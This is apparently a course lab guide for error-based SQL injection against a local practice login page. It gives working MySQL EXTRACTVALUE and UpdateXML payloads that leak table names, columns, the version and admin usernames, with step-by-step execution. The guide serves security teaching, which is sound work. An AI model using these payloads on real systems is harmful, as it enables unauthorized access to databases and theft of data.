# Task 3.A: Error-Based Schema Discovery Attack Guide

## 🎯 **Objective:**
Extract database table names by forcing MySQL errors that reveal schema information through the login form.

## 🔧 **Preparation Complete:**
✅ Error reporting has been ENABLED in `login.php`  
✅ MySQL errors will now be displayed in the login failure message

## 🔍 **Target Analysis:**
- **File:** `login.php` (with error reporting enabled)
- **Vulnerable Query:** `SELECT username, role, secret_flag FROM users WHERE username = '$username' AND password_hash = '$password'`
- **Attack Vector:** POST parameter `username`
- **Technique:** EXTRACTVALUE() function to force errors

## 🔐 **Error-Based SQL Injection Strategy:**

### **Understanding EXTRACTVALUE():**
- `EXTRACTVALUE(xml_data, xpath_expr)` extracts values from XML
- When given invalid XPath syntax, it throws an error
- We can embed database queries in the XPath to leak data through error messages

## 🛠️ **Attack Payloads:**

### **Payload 1: Extract First Table Name**
```sql
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1))) --
```

### **Payload 2: Extract All Table Names (One by One)**
```sql
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='assignment_db'))) --
```

### **Payload 3: Extract Specific Table (users)**
```sql
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' AND table_name LIKE 'users'))) --
```

### **Payload 4: Alternative using UpdateXML**
```sql
admin' AND UpdateXML(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1)), 1) --
```

## 📋 **Step-by-Step Execution:**

### **Step 1: Access Login Page**
1. Open browser
2. Navigate to: `http://localhost/sqli_lab/login.php`
3. Verify error reporting is working by entering wrong credentials

### **Step 2: Execute Error-Based Attack**
1. **Username field:** Enter the payload:
   ```
   admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1))) --
   ```

2. **Password field:** Enter anything (e.g., `test`)

3. **Click Login**

### **Step 3: Analyze Error Message**
You should see an error message like:
```
Login Failed. MySQL Error: XPATH syntax error: '~users'
```
or
```
Login Failed. MySQL Error: XPATH syntax error: '~products'
```

## 🎯 **Expected Results:**

### **Successful Attack Output:**
```
Login Failed. MySQL Error: XPATH syntax error: '~[TABLE_NAME]'
```

Where `[TABLE_NAME]` will be one of:
- `users`
- `products`

## 📸 **Deliverable 3.A Requirements:**

### **1. Error Payload:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1))) --
```

### **2. Screenshot Requirements:**
Take a screenshot showing:
- ✅ The exact payload in the Username field
- ✅ The MySQL error message displaying table name
- ✅ The complete error format: "Login Failed. MySQL Error: XPATH syntax error: '~[table_name]'"

## 🔍 **Alternative Payloads to Try:**

### **Extract Column Names:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1))) --
```

### **Extract Database Version:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', VERSION())) --
```

### **Extract Current Database:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', DATABASE())) --
```

### **Extract User Data:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT username FROM users WHERE role='admin' LIMIT 1))) --
```

## 🛠️ **How the Attack Works:**

### **Original Query:**
```sql
SELECT username, role, secret_flag FROM users WHERE username = 'admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1))) -- ' AND password_hash = 'test'
```

### **What Happens:**
1. **EXTRACTVALUE()** tries to parse XML with invalid XPath
2. **CONCAT('~', ...)** creates invalid XPath syntax
3. **MySQL throws error** containing our extracted data
4. **Error message** displays the table name we queried

## ⚠️ **Troubleshooting:**

### **If No Error Appears:**
- Verify error reporting was uncommented in `login.php`
- Check that XAMPP Apache/MySQL are running
- Try refreshing the page

### **If Query Fails:**
- Check payload syntax carefully
- Ensure single quotes are properly escaped
- Try alternative EXTRACTVALUE payloads

## 🚀 **Ready to Attack!**

### **Primary Payload to Use:**
```
admin' AND EXTRACTVALUE(1, CONCAT('~', (SELECT table_name FROM information_schema.tables WHERE table_schema='assignment_db' LIMIT 1))) --
```

### **Execution Steps:**
1. Go to `http://localhost/sqli_lab/login.php`
2. Enter the payload in **Username** field
3. Enter anything in **Password** field  
4. Click **Login**
5. Screenshot the error message showing table name

**Execute the attack now and capture the error message revealing database table names!** 🔓